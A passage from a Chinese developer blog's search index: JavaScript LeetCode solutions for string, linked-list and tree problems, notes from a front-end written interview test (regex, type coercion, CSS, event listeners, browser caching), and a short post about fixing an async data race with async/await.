<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lengthOfLongestSubstring2 = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> len = str.length</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> right = <span class="number">-1</span></span><br><span class="line">    <span class="keyword">let</span> max = <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> obj = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; len) &#123;</span><br><span class="line">        <span class="keyword">let</span> temp = str[right + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> (!obj[temp] &amp;&amp; temp !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">            obj[temp] = <span class="number">1</span></span><br><span class="line">            right++</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            obj[str[left]] = <span class="number">0</span></span><br><span class="line">            left++</span><br><span class="line">        &#125;</span><br><span class="line">        max = <span class="built_in">Math</span>.max(max, right - left + <span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="链表问题"><a href="#链表问题" class="headerlink" title="链表问题"></a>链表问题</h3><ol>
<li>给定一个链表，两两交换其中相邻的节点，并返回交换后的链表。你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 1-&gt;2-&gt;3-&gt;4, 你应该返回 2-&gt;1-&gt;4-&gt;3.</span><br></pre></td></tr></table></figure>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/swap-nodes-in-pairs/</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<hr>
<blockquote>
<p>链表问题，光靠想还是很复杂的，最好画个图。这里的话主要是涉及交换。我们定义一个新的节点让它指向head，再创建一个它的副本。当该节点的next以及next.next存在，就进行交换。<br>先定义两个变量，保存next和next.next<br>将循环节点的next指向next.next<br>再交换那两个节点</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> swapPairs = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (!head || !head.next) <span class="keyword">return</span> head</span><br><span class="line">        <span class="keyword">let</span> res = <span class="keyword">new</span> ListNode(<span class="literal">null</span>)</span><br><span class="line">        res.next = head</span><br><span class="line">        <span class="keyword">let</span> prev = res</span><br><span class="line">        <span class="keyword">while</span> (prev.next &amp;&amp; prev.next.next) &#123;</span><br><span class="line">            <span class="keyword">let</span> [fir, sec] = [prev.next, prev.next.next];</span><br><span class="line">            [prev.next, fir.next, sec.next] = [sec, sec.next, fir]</span><br><span class="line">            prev = prev.next.next</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.next</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>2.给定一个链表，删除链表的倒数第 n 个节点，并且返回链表的头结点。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 n = 2.</span><br><span class="line">当删除了倒数第二个节点后，链表变为 1-&gt;2-&gt;3-&gt;5.</span><br></pre></td></tr></table></figure></p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<hr>
<blockquote>
<p>这道链表的题就稍微简单一点，删除其实就是让节点指向其上上个元素。主要需要考虑一点边界的问题，就是n和链表元素总长的关系。如果比链表长度还长就直接返回，等于的话就返回head.next，小于就是正常的删除。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> removeNthFromEnd = <span class="function"><span class="keyword">function</span>(<span class="params">head, n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res= []</span><br><span class="line">    <span class="keyword">let</span> p = head</span><br><span class="line">    <span class="keyword">while</span> (p) &#123;</span><br><span class="line">        res.push(p)</span><br><span class="line">        p = p.next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> length = res.length</span><br><span class="line">    <span class="keyword">if</span> (n &gt;= length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n === length) &#123;</span><br><span class="line">            <span class="keyword">return</span> head.next</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res[length - n - <span class="number">1</span>].next = res[length - n].next</span><br><span class="line">    <span class="keyword">return</span> res[<span class="number">0</span>]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="深度优先遍历问题"><a href="#深度优先遍历问题" class="headerlink" title="深度优先遍历问题"></a>深度优先遍历问题</h3><ol>
<li>给定一个二叉树，返回所有从根节点到叶子节点的路径。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line"></span><br><span class="line">   1</span><br><span class="line"> /   \</span><br><span class="line">2     3</span><br><span class="line"> \</span><br><span class="line">  5</span><br><span class="line"></span><br><span class="line">输出: [&quot;1-&gt;2-&gt;5&quot;, &quot;1-&gt;3&quot;]</span><br><span class="line"></span><br><span class="line">解释: 所有根节点到叶子节点的路径为: 1-&gt;2-&gt;5, 1-&gt;3</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/binary-tree-paths" target="_blank" rel="noopener">https://leetcode-cn.com/problems/binary-tree-paths</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<hr>
<blockquote>
<p>主要就是利用递归去解决的，获取各个节点左右的节点以及相应的值，直到遍历到叶子节点。返回相应的值，需要注意的边界问题是当root不存在时以及叶子节点时的处理方式。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> binaryTreePaths = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = []</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">if</span> (!root.left &amp;&amp; !root.right) &#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">`<span class="subst">$&#123;root.val&#125;</span>`</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> leftList = binaryTreePaths(root.left)</span><br><span class="line">    <span class="keyword">let</span> rightList = binaryTreePaths(root.right)</span><br><span class="line">    leftList.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        res.push(<span class="string">`<span class="subst">$&#123;root.val&#125;</span>-&gt;<span class="subst">$&#123;item&#125;</span>`</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    rightList.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        res.push(<span class="string">`<span class="subst">$&#123;root.val&#125;</span>-&gt;<span class="subst">$&#123;item&#125;</span>`</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>2.给定一个二叉树和一个目标和，找到所有从根节点到叶子节点路径总和等于给定目标和的路径。说明: 叶子节点是指没有子节点的节点。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">示例:给定如下二叉树，以及目标和 sum = 22</span><br><span class="line">              5</span><br><span class="line">             / \</span><br><span class="line">            4   8</span><br><span class="line">           /   / \</span><br><span class="line">          11  13  4</span><br><span class="line">         /  \    / \</span><br><span class="line">        7    2  5   1</span><br><span class="line"></span><br><span class="line">返回:</span><br><span class="line">[</span><br><span class="line">   [5,4,11,2],</span><br><span class="line">   [5,8,4,5]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/path-sum-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/path-sum-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<hr>
<blockquote>
<p>这道深度优先遍历题，也可以用上一道题的思路去解决，就是会有点麻烦。先获取所有路径的值。再遍历返回和为目标值的数组</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pathSum = <span class="function"><span class="keyword">function</span>(<span class="params">root, sum</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = binaryTreePaths(root)</span><br><span class="line">    <span class="keyword">return</span> arr.filter(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> item.reduce(<span class="function">(<span class="params">prev, next</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> prev + next</span><br><span class="line">        &#125;, <span class="number">0</span>) === sum</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binaryTreePaths</span> (<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = []</span><br><span class="line">  <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!root.left &amp;&amp; !root.right) &#123;</span><br><span class="line">    <span class="keyword">return</span> [[root.val]]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> leftPaths = binaryTreePaths(root.left)</span><br><span class="line">  <span class="keyword">let</span> rightPaths = binaryTreePaths(root.right)</span><br><span class="line">  leftPaths.forEach(<span class="function">(<span class="params">leftPath</span>) =&gt;</span> &#123;</span><br><span class="line">    res.push([root.val, ...leftPath])</span><br><span class="line">  &#125;)</span><br><span class="line">  rightPaths.forEach(<span class="function">(<span class="params">rightPath</span>) =&gt;</span> &#123;</span><br><span class="line">    res.push([root.val, ...rightPath])</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><a href="https://juejin.im/post/5f05087cf265da22d466f60f" target="_blank" rel="noopener">参考文章</a></p>
</blockquote>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次面试</title>
    <url>/2019/03/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;最近一直忙于校招和毕设，以及复习一些基础的知识点。今天去了一家游戏公司的宣讲会，也做了笔试题，竟然感觉还有点难，考得有些很怪的知识点。下面就分享一下我记忆中的这些题把。<br><a id="more"></a></p>
<h2 id="1-选择题"><a href="#1-选择题" class="headerlink" title="1.选择题"></a>1.选择题</h2><p>只有两道选择题，第一道考的是文本区域可监听的事件主要考得就是onbulr、onfocues、onchange。第二道考的是正则的方法和字符串的方法<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//正则的创建</span></span><br><span class="line"><span class="keyword">var</span>  reg=<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'abc'</span>,<span class="string">'gi'</span>);</span><br><span class="line"><span class="keyword">var</span>  reg=<span class="regexp">/abc/gi</span>;</span><br><span class="line">reg.test(<span class="string">'boy    and   girl'</span>)<span class="comment">//对传入的字符串正则匹配 匹配就返回true，否则返回false。</span></span><br><span class="line"><span class="comment">//compile方法 该方法的作用是能够对正则表达式进行编译，被编译过的正则在使用的时候效率会更高，适合于对一个正则多次调用的情况下，如果对一个正则只使用一两次，那么该方法没有特别显著的效应。接受的参数也是一个正则。</span></span><br><span class="line"><span class="comment">//exec方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字符串的正则方法</span></span><br><span class="line"><span class="comment">//search方法 如果找到就返回一个number类型的index值，否则返回-1,它返回的只是第一次匹配的位置 多个匹配也只会返回第一个位置</span></span><br><span class="line"><span class="keyword">var</span> str=<span class="string">"hello world"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str.search(<span class="regexp">/o/g</span>));</span><br><span class="line"><span class="comment">//replace方法 该方法用来将字符串中的某些子串替换为需要的内容，接受两个参数，第一个参数可以为正则或者子字符串，表示匹配需要被替换的内容，第二个参数为被替换的新的子字符串。如果声明为全局匹配则会替换所有结果，否则只替换第一个匹配到的结果。</span></span><br><span class="line"><span class="keyword">var</span> str=<span class="string">"hello world,hello test"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str.replace(<span class="regexp">/hello/g</span>,<span class="string">'hi'</span>));</span><br><span class="line"><span class="comment">//match方法 该方法接受一个正则作为参数，用来匹配一个字符串，它的输出结果在不是全局匹配的情况下和exec方法的结果一致即一个数组并带有额外的属性，如果采用全局匹配，则不返回任何和其被匹配字符串相关的信息，只返回匹配的结果。</span></span><br></pre></td></tr></table></figure></p>
<h2 id="2-填空题"><a href="#2-填空题" class="headerlink" title="2.填空题"></a>2.填空题</h2><p>就考了一些字符串方法和比较结果 排序的时间和空间复杂度 还有一些奇怪的题<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">''</span>==<span class="number">0</span>)<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log([]==<span class="number">0</span>)<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;==<span class="number">0</span>)<span class="comment">//false</span></span><br><span class="line"><span class="comment">//如果比较的双方是字符串和数字 那就把字符串转成number  布尔值和其他值 把布尔值转换成number 对象会调用valueOf或者toString转换  其他任何值都不和null和undefined相等</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>toString()<span class="comment">//报错 .是一个有效的数字字符</span></span><br><span class="line"><span class="number">3</span> .toString()<span class="comment">//'3'</span></span><br><span class="line"><span class="number">3.</span>.toString()<span class="comment">//'3'</span></span><br><span class="line"><span class="number">3.</span>..toString()<span class="comment">//报错</span></span><br></pre></td></tr></table></figure></p>
<p>下面是排序的一张图 具体还是要知道对应的是怎么排的<br><img src="/images/paixu.png" alt="My Pic"></p>
<h2 id="3-简答题"><a href="#3-简答题" class="headerlink" title="3.简答题"></a>3.简答题</h2><h3 id="1-js的实践执行顺序"><a href="#1-js的实践执行顺序" class="headerlink" title="1.js的实践执行顺序"></a>1.js的实践执行顺序</h3><p>先顺序执行代码，遇到宏任务放到宏任务队列中，遇到微任务放到微任务队列中。一轮完成之后检查微任务队列是否为空，不为空就执行微任务，再依次这样，知道执行完。</p>
<h3 id="2正则匹配（永远的桶）"><a href="#2正则匹配（永远的桶）" class="headerlink" title="2正则匹配（永远的桶）"></a>2正则匹配（永远的桶）</h3><p>因为平时都是网上直接copy，真要自己写一个出来，真的是无从下笔。还是要了解一下基本的用法啊</p>
<h3 id="3-css渲染开启硬件加速"><a href="#3-css渲染开启硬件加速" class="headerlink" title="3.css渲染开启硬件加速"></a>3.css渲染开启硬件加速</h3><p>硬件加速就是将浏览器的渲染过程交给GPU处理，而不是使用自带的比较慢的渲染器。这样就可以使得animation与transition更加顺畅。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设置一些css属性就可以开启硬件加速</span><br><span class="line">transform: translate3d(250px,250px,250px)</span><br><span class="line">           rotate3d(250px,250px,250px,-120deg)</span><br><span class="line">            scale3d(0.5, 0.5, 0.5);</span><br><span class="line"> -webkit-transform: translateZ(0);</span><br><span class="line">   -moz-transform: translateZ(0);</span><br><span class="line">   -ms-transform: translateZ(0);</span><br><span class="line">   -o-transform: translateZ(0);</span><br><span class="line">   transform: translateZ(0);</span><br></pre></td></tr></table></figure></p>
<h3 id="4-css如何隐藏内容（不影响屏幕阅读器阅读呢？）"><a href="#4-css如何隐藏内容（不影响屏幕阅读器阅读呢？）" class="headerlink" title="4.css如何隐藏内容（不影响屏幕阅读器阅读呢？）"></a>4.css如何隐藏内容（不影响屏幕阅读器阅读呢？）</h3><p>刚看到这一题也有点蒙，什么事屏幕阅读器呢？查了一下才知道是为视觉上有障碍的人设计的读取屏幕内容的程序<br>知道之后就容易啦。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.display:none;的缺陷</span><br><span class="line"></span><br><span class="line">搜索引擎可能认为被隐藏的文字属于垃圾信息而被忽略</span><br><span class="line"></span><br><span class="line">屏幕阅读器（是为视觉上有障碍的人设计的读取屏幕内容的程序）会忽略被隐藏的文字，同时不利于搜索引擎。</span><br><span class="line"></span><br><span class="line">2. visibility: hidden ;的缺陷</span><br><span class="line"></span><br><span class="line">这个大家应该比较熟悉就是隐藏的内容会占据他所应该占据物理空间</span><br><span class="line"></span><br><span class="line">3.overflow:hidden;一个比较合理的方法</span><br><span class="line"></span><br><span class="line">4.opacity:0;</span><br></pre></td></tr></table></figure></p>
<h3 id="5-dom-onclick和addEventlistener的区别"><a href="#5-dom-onclick和addEventlistener的区别" class="headerlink" title="5.dom.onclick和addEventlistener的区别"></a>5.dom.onclick和addEventlistener的区别</h3><p>onclick只出现一次，但是addEventListener却可以先后运行不会被覆盖，addEventListener允许给一个事件注册多个监听器。在使用DHTML库或者 Mozilla extensions 这样需要保证能够和其他的库或者差距并存的时候非常有用。addEventListener还可以设置事件在哪个阶段触发（冒泡、捕获）</p>
<h3 id="6-什么是浏览器缓存（什么是强制缓存和协商缓存）"><a href="#6-什么是浏览器缓存（什么是强制缓存和协商缓存）" class="headerlink" title="6.什么是浏览器缓存（什么是强制缓存和协商缓存）"></a>6.什么是浏览器缓存（什么是强制缓存和协商缓存）</h3><p>浏览器在用户磁盘上对最近请求过的文档进行存储，当访问者再次请求这个页面时，浏览器就可以直接从本地磁盘读取资源并展示，这样就可以加速页面的阅览。<br>缓存的好处：<br>1.缓解服务器压力(不用每次去服务器请求资源)；</p>
<p>2.提升性能(打开本地资源速度当然比打开请求回来资源的速度要快得多)；</p>
<p>3.减少带宽消耗(获取数据相当于下载资源的过程，必定会占用一定的网络带宽——就是您家的网速啦~)；</p>
<p>强缓存：<br>客户端第一次问服务器要某个资源时，服务器丢还给客户端所请求的这个资源同时，告诉客户端将这个资源保存在本地，并且在未来的某个时点之前如果还需要这个资源，直接从本地获取就行了，不用向服务器请求。这种方式缓存下来的资源称为强缓存。<br>Cache-Control字段 如果没有命中缓存，浏览器直接向服务器发起请求，Cache-Control会在重新获取到服务器返回资源时更新。<br>cache-control的值：<br>public指示响应可被任何缓存区缓存，包括终端用户和CDN等代理服务器。<br>private只允许被终端用户的浏览器端缓存，对于单个用户的整个或部分响应消息，不能被代理服务器将其保存在共享缓存里。服务器仅仅描述当用户的部分响应消息，此响应消息对于其他用户的请求无效。<br>no-cache禁止使用强缓存，设置了no-cache之后并不代表浏览器不缓存，而是在缓存前要向服务器确认资源是否被更改。因此有的时候只设置no-cache防止缓存还是不够保险，还可以加上private指令，过期时间max-age=0。<br>no-store禁止使用缓存，每次都要去服务器重新请求，用于防止重要的信息被无意的发布。max-age表示自第一次收到响应后的xxx ms以后可以用缓存。min-fresh表示客户端希望在指定的时间内获取最新的响应。max-stale表明客户端愿意接收一个已经过期的资源。 可选的设置一个时间(单位秒)，表示响应不能超过的过时时间。注意：命中强缓存时，浏览器同样会收到status=200的response，chrome中可通过size区分从服务器返回的资源还是强缓存获得的资源</p>
<p>协商缓存：<br>客户端第一次问服务器要某个资源时，服务器丢还给客户端所请求的这个资源同时，将该资源的一些信息也返回给客户端，告诉客户端将这个资源缓存在本地。当客户端下一次需要这个资源时，将请求以及相关信息一并发送给服务器，由服务器来判断客户端缓存的资源是否需要更新：如不需要更新，就直接告诉客户端获取本地缓存资源（304）；如需要更新，则将最新的资源连同相应的信息一并返回给客户端。</p>
<p>Last-Modified If-Modified-Since ETag  If-None-Match</p>
<h1 id="4编程题"><a href="#4编程题" class="headerlink" title="4编程题"></a>4编程题</h1><p>最后考得是一道字符串截取题截取指定两个字符之间的子字符串。</p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>记工作中犯得一次错</title>
    <url>/2018/08/09/%E8%AE%B0%E5%B7%A5%E4%BD%9C%E4%B8%AD%E7%8A%AF%E5%BE%97%E4%B8%80%E6%AC%A1%E9%94%99/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;感觉工作以后 ，就变得很忙了 出了下班和周末  很难有自己思考和学习的时间了。最近在完成了一个项目之后，提测的过程中出现了一个问题。就是一个数据的显示问题，与用户的状态不匹配。最后找出来原因，都是异步回调惹的祸。发现自己要学习的东西还有很多很多，对一些工具的使用太过于表面，不懂其实现的原理。<br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;&nbsp;下面就讲一下我在项目中所遇到的问题吧。<br>&nbsp;&nbsp;&nbsp;&nbsp;一段文字 我需要通过从接口返回来的数据来判断应该在这里显示什么。由于我使用的是vue框架 我在app.vue变通过vuex封装的action 调用了获取用户信息的方法，在首页中通过获取vuex中保存的用户信息来进行判断，这时就有就有一个奇怪的事发生了 用户进来这里显示的文字不一定和用户的信息相匹配。于是我在判断的上面输出了此时的userinfo里面的值，发现打印出来都是有值的 但是就是下面的显示会有问题 此时自己也慌了 因为定的时间就是等会就要上线。此时就会出现一个大佬，也就是我的前端经理 让我先直接用笨办法先解决 也就是直接在判断的时候加一个setTimeout 让这个放在消息队列的最后，也就一定会等到异步回调返回结果之后 再进行判断。虽然问题解决了 但是还是觉得很沮丧 自己太菜了 。<br>所以就要开始学习了。<br>&nbsp;&nbsp;&nbsp;&nbsp;下面讲一下自己后来学习到的东西<br>&nbsp;&nbsp;&nbsp;&nbsp;首先我最常使用的async+await 让异步回调的每一步都在你的掌控之中<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">await</span> axios.get(<span class="string">'https://www.codoon.com/activity/v1/marathon-test-2018/user/info'</span>)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(response.status)&#123;</span><br><span class="line">that.$store.commit(<span class="string">'UPDATEUSERINFO'</span>, response.data);</span><br><span class="line"><span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">alert(response.description)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(response)</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">alert(error);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">await</span> axios.get(<span class="string">'https://www.codoon.com/www/v2/training_plan_v3/get_race_score'</span>, &#123;</span><br><span class="line">params: &#123;</span><br><span class="line">race_type: that.data.choosed1.value,</span><br><span class="line">user_id: that.actInfo.userId</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(response.status)&#123;</span><br><span class="line"><span class="keyword">if</span>(response.data.score==<span class="number">0</span>)&#123;</span><br><span class="line">alert(<span class="string">'抱歉未获取到您该类型的成绩,请自行填写'</span>)</span><br><span class="line">&#125;</span><br><span class="line">that.total = response.data.score;</span><br><span class="line">that.data.choosed2.hour = that.total%<span class="number">3600</span>;</span><br><span class="line">that.data.choosed2.min = (that.total - that.data.choosed2.hour*<span class="number">3600</span>)%<span class="number">60</span>;</span><br><span class="line">that.data.choosed2.sec = (that.total - that.data.choosed2.hour*<span class="number">3600</span> - that.data.choosed2.min*<span class="number">60</span>);</span><br><span class="line"><span class="built_in">console</span>.log(response)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">alert(response.description)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(response)</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">alert(error);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">g().then(<span class="function"><span class="params">v</span>=&gt;</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.data.choosed2.hour = <span class="built_in">Math</span>.floor(<span class="keyword">this</span>.total/<span class="number">3600</span>);</span><br><span class="line"><span class="keyword">this</span>.data.choosed2.min = <span class="built_in">Math</span>.floor((<span class="keyword">this</span>.total - <span class="keyword">this</span>.data.choosed2.hour*<span class="number">3600</span>)/<span class="number">60</span>);</span><br><span class="line"><span class="keyword">this</span>.data.choosed2.sec = (<span class="keyword">this</span>.total - <span class="keyword">this</span>.data.choosed2.hour*<span class="number">3600</span> - <span class="keyword">this</span>.data.choosed2.min*<span class="number">60</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">this</span>.data.choosed2)</span><br><span class="line"><span class="keyword">this</span>.setMum(<span class="literal">false</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>这里就使用了async+await调用了两个接口  并且确定是先执行user/info接口在执行后面那个接口 这样就不怕数据还没获取到就进行了操作了。</p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>vue</tag>
      </tags>
  </entry>
</search>
